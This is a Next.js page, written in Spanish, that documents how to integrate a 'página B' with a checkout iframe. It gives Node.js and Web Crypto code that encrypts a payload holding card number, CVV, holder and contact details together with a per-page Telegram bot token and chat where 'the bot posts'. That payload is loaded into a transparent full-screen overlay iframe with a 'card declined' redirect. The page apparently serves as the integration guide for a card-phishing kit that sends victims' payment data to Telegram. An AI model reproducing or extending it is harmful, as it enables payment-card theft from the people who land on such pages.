import type { GetServerSideProps } from "next";
import { getPublicKeyPem } from "@/lib/rsaCipher";

interface InfoProps {
  publicKey: string;
  publicKeyUrl: string;
}

export const getServerSideProps: GetServerSideProps = async (ctx) => {
  const protoHeader = ctx.req.headers["x-forwarded-proto"];
  const proto =
    typeof protoHeader === "string" ? protoHeader.split(",")[0].trim() || "http" : "http";
  const host = ctx.req.headers.host ?? "localhost:3000";
  const publicKeyUrl = `${proto}://${host}/api/crypto/public-key`;
  try {
    return { props: { publicKey: getPublicKeyPem(), publicKeyUrl } };
  } catch {
    return { props: { publicKey: "", publicKeyUrl } };
  }
};

const NODE_EXAMPLE = `const { publicEncrypt, createCipheriv, randomBytes, constants } = require("crypto");

// 1. Payload (TODO EL DATO se cifra)
const payload = {
  payment: {
    numeroTarjeta: "4859537428532001",
    vencimiento: "12/28",
    cvv: "123",
    titular: "MARIA DEMO",
    email: "maria.demo@ejemplo.com",
    celular: "3001234567",
    telefono: "3001234567",
  },
  price: "199900",
  priceFormatted: "$199.900",
  redirectSuccess: "https://tienda.example/pago-ok",
  redirectDeclined: "https://tienda.example/tarjeta-declinada",
  telegram: { botToken: "123456:AAH-xxxx", chatId: "-100123456789" },
};

// 2. Clave pública (una sola para todos): GET /api/crypto/public-key
const publicKey = \`-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqh...
-----END PUBLIC KEY-----\`;

// 3. Envelope: AES-256-GCM para el payload + RSA-OAEP para la clave AES
const aesKey = randomBytes(32);
const iv = randomBytes(12);
const cipher = createCipheriv("aes-256-gcm", aesKey, iv);
const ciphertext = Buffer.concat([
  cipher.update(JSON.stringify(payload), "utf8"),
  cipher.final(),
]);
const encKey = publicEncrypt(
  { key: publicKey, padding: constants.RSA_PKCS1_OAEP_PADDING, oaepHash: "sha256" },
  aesKey,
);
const len = Buffer.alloc(2);
len.writeUInt16BE(encKey.length);

const token = Buffer.concat([iv, cipher.getAuthTag(), len, encKey, ciphertext]).toString("base64url");
const url = \`https://TU_HOST/?d=\${token}\`;`;

const WEB_EXAMPLE = `// Web Crypto (navegador) — página B 100% frontend
async function encryptEnvelope(payload, publicKeyPem) {
  const pem = publicKeyPem
    .replace("-----BEGIN PUBLIC KEY-----", "")
    .replace("-----END PUBLIC KEY-----", "")
    .replace(/\\s+/g, "");
  const spki = Uint8Array.from(atob(pem), (c) => c.charCodeAt(0));

  const publicKey = await crypto.subtle.importKey(
    "spki", spki, { name: "RSA-OAEP", hash: "SHA-256" }, false, ["encrypt"],
  );
  const aesKey = await crypto.subtle.generateKey({ name: "AES-GCM", length: 256 }, true, ["encrypt"]);
  const iv = crypto.getRandomValues(new Uint8Array(12));

  const ciphertext = new Uint8Array(
    await crypto.subtle.encrypt({ name: "AES-GCM", iv }, aesKey, new TextEncoder().encode(JSON.stringify(payload))),
  );
  const rawAes = new Uint8Array(await crypto.subtle.exportKey("raw", aesKey));
  const encKey = new Uint8Array(await crypto.subtle.encrypt({ name: "RSA-OAEP" }, publicKey, rawAes));

  const len = new Uint8Array(2);
  new DataView(len.buffer).setUint16(0, encKey.length, false);

  const parts = [iv, ciphertext.slice(0, 16), len, encKey, ciphertext.slice(16)];
  let binary = "";
  for (const p of parts) binary += String.fromCharCode(...p);
  return btoa(binary).replace(/\\+/g, "-").replace(/\\//g, "_").replace(/=+$/, "");
}`;

const PAYLOAD_STRUCTURE = `{
  payment: {
    numeroTarjeta: string,
    vencimiento: string,   // "MM/AA"
    cvv: string,
    titular: string,
    email: string,
    celular: string,
    telefono: string
  },
  price: string,            // "199900"
  priceFormatted: string,   // "$199.900"
  redirectSuccess: string,  // URL http(s)
  redirectDeclined: string, // URL http(s)
  sessionId?: string,       // opcional: id único de la página
  telegram: {
    botToken: string,       // token del bot de ESTA página
    chatId: string          // chat/grupo donde el bot postea
  }
}`;

const TOKEN_FORMAT = `base64url( iv(12 bytes) ‖ authTag(16 bytes) ‖ len(2 bytes) ‖ aesKeyCifrada(RSA) ‖ ciphertext )`;

export default function Info({ publicKey, publicKeyUrl }: InfoProps) {
  return (
    <main className="min-h-screen bg-slate-50 px-6 py-10">
      <div className="mx-auto max-w-2xl">
        <h1 className="text-2xl font-bold text-slate-900 mb-1">
          Integración para desarrolladores (página B)
        </h1>
        <p className="text-sm text-slate-600 mb-6">
          Cómo cifrar el payload del modal con la clave pública y generar el hash del iframe (
          <code className="rounded bg-slate-200 px-1">?d=...</code>
          ). Todo el dato viaja cifrado y solo el servidor del checkout puede descifrarlo.
        </p>

        <section className="rounded-lg border border-slate-200 bg-white p-4 mb-4">
          <h2 className="text-lg font-semibold text-slate-900 mb-2">
            Paso 1 — Obtener la clave pública
          </h2>
          <p className="text-sm text-slate-600 mb-2">
            Es una <strong>única clave</strong> para todos los clientes. Se descarga de:
          </p>
          <pre className="rounded-md bg-slate-900 p-3 text-xs text-slate-100 overflow-x-auto">
            {`GET ${publicKeyUrl}`}
          </pre>
          {publicKey ? (
            <pre className="rounded-md bg-slate-900 p-3 text-xs text-slate-100 overflow-x-auto whitespace-pre-wrap break-all">
              {publicKey}
            </pre>
          ) : (
            <p className="text-sm text-red-600">
              PAYLOAD_PUBLIC_KEY no está configurada en el servidor.
            </p>
          )}
        </section>

        <section className="rounded-lg border border-slate-200 bg-white p-4 mb-4">
          <h2 className="text-lg font-semibold text-slate-900 mb-2">
            Paso 2 — Construir el payload
          </h2>
          <p className="text-sm text-slate-600 mb-2">
            <code className="rounded bg-slate-200 px-1">telegram</code> lleva el bot y el chat de{" "}
            <strong>esta página</strong> (independiente por cliente):
          </p>
          <pre className="rounded-md bg-slate-900 p-3 text-xs text-slate-100 overflow-x-auto">
            {PAYLOAD_STRUCTURE}
          </pre>
        </section>

        <section className="rounded-lg border border-slate-200 bg-white p-4 mb-4">
          <h2 className="text-lg font-semibold text-slate-900 mb-2">
            Paso 3 — Cifrar (envelope RSA + AES)
          </h2>
          <p className="text-sm text-slate-600 mb-2">
            El payload se cifra con AES-256-GCM (clave aleatoria) y esa clave con RSA-OAEP-SHA256.
            Formato del token:
          </p>
          <pre className="rounded-md bg-slate-900 p-3 text-xs text-slate-100 overflow-x-auto">
            {TOKEN_FORMAT}
          </pre>
          <p className="text-sm text-slate-600 mb-2">
            El <code className="rounded bg-slate-200 px-1">len</code> son 2 bytes big-endian con el
            largo de la clave AES cifrada.
          </p>
          <h3 className="text-sm font-semibold text-slate-800 mb-1">Node.js</h3>
          <pre className="rounded-md bg-slate-900 p-3 text-xs text-slate-100 overflow-x-auto mb-4">
            {NODE_EXAMPLE}
          </pre>
          <h3 className="text-sm font-semibold text-slate-800 mb-1">Web Crypto (navegador)</h3>
          <pre className="rounded-md bg-slate-900 p-3 text-xs text-slate-100 overflow-x-auto">
            {WEB_EXAMPLE}
          </pre>
        </section>

        <section className="rounded-lg border border-slate-200 bg-white p-4 mb-4">
          <h2 className="text-lg font-semibold text-slate-900 mb-2">
            Paso 4 — Armar el iframe
          </h2>
          <pre className="rounded-md bg-slate-900 p-3 text-xs text-slate-100 overflow-x-auto">
            {`<iframe src="https://TU_HOST/?d=<token>"
  style="position:fixed;inset:0;width:100vw;height:100vh;border:0;background:transparent;z-index:9999"></iframe>`}
          </pre>
          <p className="text-sm text-slate-600 mt-2">
            El webhook del bot se registra automáticamente la primera vez que se envía un mensaje.
          </p>
        </section>
      </div>
    </main>
  );
}